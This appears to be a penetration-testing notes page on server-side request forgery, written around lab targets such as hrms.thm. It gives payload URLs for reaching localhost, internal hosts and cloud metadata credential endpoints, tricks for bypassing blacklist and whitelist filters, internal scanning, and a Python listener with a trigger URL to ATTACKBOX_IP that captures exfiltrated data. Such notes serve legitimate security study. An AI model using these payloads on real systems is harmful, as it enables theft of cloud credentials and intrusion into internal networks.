---
layout: default
title: "SSRF"
parent: "Web Application"
nav_order: 29
---

# Server-Side Request Forgery (SSRF)

SSRF is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location — whether internal resources, the server's own localhost, or external targets — on behalf of the web server.

---

## Basic SSRF

The goal is to use the target server as a proxy to access resources that you couldn't reach directly.

**URL parameter manipulation:**
```
http://hrms.thm/?url=localhost/config
http://hrms.thm/?url=localhost/admin
http://vulnerable.com/product/stock?stockApi=http://localhost/admin
```

**Common internal targets:**
- `localhost` or `127.0.0.1`
- `169.254.169.254` — AWS metadata endpoint
- `http://192.168.0.1` — internal network

---

## Blacklist-Based Filter Bypass

When applications block `127.0.0.1`, `localhost`, or `/admin`:

### Alternate IP Representations
```
127.1
2130706433      (decimal)
017700000001    (octal)
0x7f000001      (hex)
```

### Double URL Encoding
Encode characters in blocked strings:
```
/admin → /%2561dmin   (double-encode 'a' → %25 = %, then 61 = 'a')
http://127.1/%2561dmin
```

### Domain That Resolves to 127.0.0.1
```
spoofed.burpcollaborator.net
```

### Redirect from Trusted URL
Host a redirect on a trusted domain that points to the blocked resource. Try:
- Different HTTP redirect codes (301, 302, 307, 308)
- Switching protocol during redirect (http → https)

---

## Whitelist-Based Filter Bypass

When applications only allow specific trusted hosts:

### Credentials in URL
```
https://expected-host:fakepassword@evil-host
```

### Fragment Trick
```
https://evil-host#expected-host
```

### Subdomain Trick
```
https://expected-host.evil-host.com
```

### URL Encoding
Encode characters that the filter decodes before matching, but the backend URL handler doesn't:
```
https://expected-host%2fevil-path
```
Also try double-encoding for servers that recursively decode.

### Open Redirect Chain
If the trusted host has an open redirect:
```
POST /product/stock
stockApi=http://trusted-host.com/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

---

## Blind SSRF

Application makes the request but doesn't return the response to the attacker.

### Out-of-Band Detection
Use Burp Collaborator or your own server to detect DNS/HTTP callbacks:
```
http://vulnerable.com/product?url=http://BURP-COLLABORATOR-SUBDOMAIN
```

**Try adding a `Referer` header** if the standard URL parameter doesn't trigger SSRF — some applications use the Referer header for external requests.

### Blind SSRF Server to Capture Responses
```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote

class CustomRequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        self.send_response(200)
        self.end_headers()
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        self.wfile.write(f'Received: {post_data}'.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    httpd.serve_forever()
```

Trigger: `http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080`

---

## Other SSRF Scenarios

### Internal Network Scanning
Use SSRF to scan internal hosts and ports by iterating IPs and watching for response differences:
```
stockApi=http://192.168.0.§1§/admin
```

### Cloud Metadata Endpoints
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/
```

### DDoS via SSRF
Force the server to request a resource it cannot handle (e.g., an oversized file or an infinite response).
